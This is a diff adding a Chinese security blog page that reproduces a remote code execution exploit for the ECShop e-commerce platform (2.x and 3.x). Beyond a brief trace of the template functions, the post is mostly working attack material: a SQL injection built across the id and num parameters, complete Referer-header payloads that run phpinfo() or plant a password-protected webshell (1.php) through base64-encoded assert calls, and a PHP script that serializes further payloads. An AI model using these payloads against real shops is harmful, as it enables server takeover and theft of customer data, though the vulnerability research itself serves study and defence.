@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="ECShop &lt;&#x3D; 2.7.x 代码执行漏洞一、漏洞简介二、漏洞影响ECShop（2.x、3.0.x、3.6.x） 三、复现过程漏洞分析 继续看fetch函数  追踪_eval函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/ECShop/ECShop%20_=%202.7.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="ECShop &lt;&#x3D; 2.7.x 代码执行漏洞一、漏洞简介二、漏洞影响ECShop（2.x、3.0.x、3.6.x） 三、复现过程漏洞分析 继续看fetch函数  追踪_eval函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId37.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId38.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId39.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId40.png">
+<meta property="article:published_time" content="2022-07-08T06:25:55.219Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ECShop/ECShop _= 2.7.x 代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/ECShop/ECShop%20_=%202.7.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:55.219Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ECShop-lt-2-7-x-代码执行漏洞"><a href="#ECShop-lt-2-7-x-代码执行漏洞" class="headerlink" title="ECShop &lt;= 2.7.x 代码执行漏洞"></a>ECShop &lt;= 2.7.x 代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ECShop（2.x、3.0.x、3.6.x）</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>继续看fetch函数</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
+<p>追踪_eval函数</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
+<p>$position_style变量来源于数据库中的查询结构</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
+<p>然后我们继续构造SQL注入，因为这段sql操作 order by部分换行了截断不了<br>所以需要在id处构造注释来配合num进行union查询</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
+<p>payload</p>
+<pre><code>SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop27`.`ecs_ad` AS a LEFT JOIN `ecshop27`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time &lt;= &#39;1535678679&#39; AND end_time &gt;= &#39;1535678679&#39; AND a.position_id = &#39;&#39;/*&#39; ORDER BY rnd LIMIT */ union select 1,2,3,4,5,6,7,8,9,10-- -
+</code></pre>
+<p>函数中有一个判断</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
+<p>我们 id传入’/*</p>
+<p>num传入*/ union select 1,0x272f2a,3,4,5,6,7,8,9,10– -就能绕过了</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
+<p>var_dump一下</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
+<p>再看fetch函数,传入的参数被fetch_str函数处理了</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
+<p>追踪fetch_str函数，这里的字符串处理流程比较复杂</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
+<pre><code>return preg_replace(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, $source);
+</code></pre>
+<p>这一行意思是比如$source是xxxx{$asd}xxx,那么经过这行代码处理后就是返回this-&gt;select(‘$asd’)的结果</p>
+<p>看看select函数</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
+<p>第一个字符为$时进入$this-&gt;get_val函数</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId37.png"></p>
+<p>我们$val没有.$又进入make_var函数</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
+<p>最后这里引入单引号从变量中逃逸</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId39.png"></p>
+<p>我们要闭合_var所以最终payload是</p>
+<pre><code>&#123;$asd&#39;];assert(base64_decode(&#39;ZmlsZV9wdXRfY29udGVudHMoJzEudHh0JywnZ2V0c2hlbGwnKQ==&#39;));//&#125;xxx
+</code></pre>
+<p>会在网站跟目录生成1.txt 里面内容是getshell</p>
+<p><img src="/resource/ECShop%3C=2.7.x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId40.png"></p>
+<h3 id="2-x"><a href="#2-x" class="headerlink" title="2.x"></a>2.x</h3><p>phpinfo():</p>
+<pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&#39; /*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca
+</code></pre>
+<p>webshell:</p>
+<pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&#39;/*&quot;;&#125;
+</code></pre>
+<p>　　会在网站根目录生成<code>1.php</code>，密码：<code>1337</code></p>
+<h3 id="3-x"><a href="#3-x" class="headerlink" title="3.x"></a>3.x</h3><p>phpinfo():</p>
+<pre><code>Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#39; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a
+</code></pre>
+<p>webshell:</p>
+<pre><code>Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:289:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#39; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a
+</code></pre>
+<p>　　会在网站根目录生成<code>1.php</code>，密码：<code>1337</code></p>
+<h3 id="小脚本"><a href="#小脚本" class="headerlink" title="小脚本"></a>小脚本</h3><p>　　下面给出一个序列化的php脚本（第9个位置就是你想要的）：</p>
+<pre><code>&lt;?php
+$arr=array(&#39;num&#39;=&gt;&#39;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7B24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4575634768774A79776E50443977614841675A585A686243676B58314250553152624F546C644B543867506963702729293B2F2F7D787878,10-- -&#39;,&#39;id&#39;=&gt;&#39;\&#39;/*&#39;);
+echo serialize($arr);
+?&gt;
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1333449">https://cloud.tencent.com/developer/article/1333449</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/ECShop/ECShop%20_=%202.7.x%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qo63005ly8v11eok923b" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Elasticsearch/Elasticsearch%201.5.x%20%E5%90%8E%E5%8F%B0getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/ECShop/ECShop%20_=%202.7.x%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
